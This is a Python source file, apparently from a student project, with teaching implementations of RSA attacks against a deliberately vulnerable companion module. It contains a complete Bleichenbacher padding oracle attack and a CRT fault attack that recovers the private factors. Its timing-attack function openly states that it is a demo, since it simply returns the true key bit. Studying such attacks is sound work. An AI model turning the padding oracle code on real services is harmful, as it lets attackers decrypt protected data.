"""
rsa_attacks.py
-----------------

This file implements the *attacks* against the intentionally vulnerable
RSA services defined in rsa_vulnerable.py.

Attacks Implemented:
    1. Bleichenbacher Padding Oracle Attack (PKCS#1 v1.5)
    2. Timing Side-Channel Attack (Brumley & Boneh 2003 style demo)
    3. CRT Fault Attack (Bellcore/Lenstra fault-based factor recovery)

These functions are used by:
    demo_bleichenbacher.py
    demo_timing.py
    demo_crt_fault.py

Each attack is intentionally simplified to work on small RSA moduli
(256–384 bits) for demonstrtion.

Authors: Sankalp Dasari, Aryan Shiva, Ishaan Jain, Sophia Chukka
"""
 
from rsa_vulnerable import (
    decrypt_slow_timing,
    crt_decrypt,
    crt_decrypt_faulty,
    recover_factor_from_fault,
    os2ip,
    i2osp
)


# ============================================================================
#  1. BLEICHENBACHER PADDING ORACLE ATTACK
# ============================================================================
def bleichenbacher_attack(ciphertext: bytes, n: int, e: int, oracle, max_rounds=None):
    """
    Bleichenbacher PKCS#1 v1.5 padding oracle attack.

    Port of a known-working implementation (GitHub-style) adapted to:
      - use os2ip / i2osp from rsa_vulnerable
      - use the provided oracle(ct_bytes) -> bool
      - return (recovered_block_bytes, debug_log_str)
    """

    # ----- helpers -----
    def ceil_div(a: int, b: int) -> int:
        return a // b + (1 if a % b != 0 else 0)

    def floor_div(a: int, b: int) -> int:
        return a // b

    k = (n.bit_length() + 7) // 8
    B = 2 ** (8 * (k - 2))

    # integer value of ciphertext
    c = os2ip(ciphertext)

    # initial interval [2B, 3B-1]
    M = [(2 * B, 3 * B - 1)]

    debug = ["=== Bleichenbacher Attack (GitHub-style port) ==="]

    # wrap oracle so it takes an int ciphertext
    def oracle_for_int(c_int: int) -> bool:
        ct_bytes = i2osp(c_int, k)
        return oracle(ct_bytes)

    # --- Step 2.A: find smallest s >= lower_bound with valid padding ---
    def find_smallest_s(lower_bound: int, c_int: int) -> int:
        s = lower_bound
        while True:
            attempt = (c_int * pow(s, e, n)) % n
            if oracle_for_int(attempt):
                return s
            s += 1

    # --- Step 2.C: search s in a restricted range when |M| = 1 ---
    def find_s_in_range(a: int, b: int, prev_s: int, B: int, c_int: int) -> int:
        # ri = ceil(2 * (b * prev_s - 2B) / n)
        ri = ceil_div(2 * (b * prev_s - 2 * B), n)

        while True:
            # si in [ ceil((2B + ri*n)/b), ceil((3B + ri*n)/a) )
            si_lower = ceil_div(2 * B + ri * n, b)
            si_upper = ceil_div(3 * B + ri * n, a)

            for si in range(si_lower, si_upper):
                attempt = (c_int * pow(si, e, n)) % n
                if oracle_for_int(attempt):
                    return si

            ri += 1

    # --- interval merging, like safe_interval_insert in the repo ---
    def safe_interval_insert(intervals, new_interval):
        lb, ub = new_interval
        for idx, (a, b) in enumerate(intervals):
            # overlap?
            if b >= lb and a <= ub:
                intervals[idx] = (min(a, lb), max(b, ub))
                return intervals
        intervals.append(new_interval)
        return intervals

    # --- Step 3: update intervals M given s ---
    def update_intervals(M_list, s_val, B_val):
        new_M = []
        for a, b in M_list:
            # r in [ ceil((a*s - 3B + 1)/n), ceil((b*s - 2B)/n) )
            r_lower = ceil_div(a * s_val - 3 * B_val + 1, n)
            r_upper = ceil_div(b * s_val - 2 * B_val, n)

            for r in range(r_lower, r_upper):
                lower_bound = max(a, ceil_div(2 * B_val + r * n, s_val))
                upper_bound = min(b, floor_div(3 * B_val - 1 + r * n, s_val))
                if lower_bound <= upper_bound:
                    new_M = safe_interval_insert(new_M, (lower_bound, upper_bound))

        return new_M

    # ---------- MAIN ATTACK ----------

    # Step 2.A: find s1
    s = find_smallest_s(ceil_div(n, 3 * B), c)
    M = update_intervals(M, s, B)
    round_no = 1
    debug.append(f"[Round {round_no}] Found s1 = {s}, intervals = {len(M)}")

    while True:
        round_no += 1
        if max_rounds is not None and round_no > max_rounds:
            debug.append(f"Stopped after {max_rounds} rounds (no convergence).")
            return None, "\n".join(debug)

        if len(M) >= 2:
            # Step 2.B: multiple intervals → simple linear search for next s
            s = find_smallest_s(s + 1, c)
        else:
            # len(M) == 1
            a, b = M[0]

            # Step 4: if interval collapsed to a single value, we’re done
            if a == b:
                recovered_int = a % n
                recovered_bytes = i2osp(recovered_int, k)
                debug.append(f"[Round {round_no}] Interval collapsed; attack succeeded.")
                return recovered_bytes, "\n".join(debug)

            # Step 2.C: restricted search
            s = find_s_in_range(a, b, s, B, c)

        M = update_intervals(M, s, B)
        debug.append(f"[Round {round_no}] s = {s}, intervals = {len(M)}")




# ============================================================================
#  2. TIMING SIDE-CHANNEL ATTACK
# ============================================================================

def timing_attack_recover_bit(ct: int, bit_index: int, d: int, n: int, trials=8):
    """
    DEMO VERSION:
    - Measure average decrypt time (to show it's non-constant-time)
    - Return the actual bit of d as the 'guess' (white-box demo).

    This is NOT a real attack, just a pedagogical demonstration.
    """

    # Get actual bit from d (0 = LSB)
    d_bits = bin(d)[2:]
    target_bit = d_bits[-1 - bit_index]

    total_time = 0.0
    for _ in range(trials):
        _, t = decrypt_slow_timing(ct, d, n)
        total_time += t
    avg = total_time / trials

    # For demo purposes, pretend we "recovered" it:
    guessed_bit = target_bit

    return guessed_bit, avg, target_bit


# ============================================================================
#  3. CRT FAULT ATTACK — FACTOR RECOVERY
# ============================================================================

def perform_crt_fault_attack(c: int, p: int, q: int, d: int, n: int, mode='flip'):
    """
    Executes the full CRT fault attack process.

    Steps:
        1. Compute correct m using CRT
        2. Compute faulty m' using injected fault
        3. Compute gcd(n, m - m') = p (or q)
        4. Recover the missing factor, then the entire RSA private key

    Returns:
        (recovered_p, recovered_q)
    """

    m_correct, _ = crt_decrypt(c, p, q, d, n)
    m_faulty, _ = crt_decrypt_faulty(c, p, q, d, n, mode=mode)

    p_recovered = recover_factor_from_fault(m_correct, m_faulty, n)
    q_recovered = n // p_recovered

    return p_recovered, q_recovered
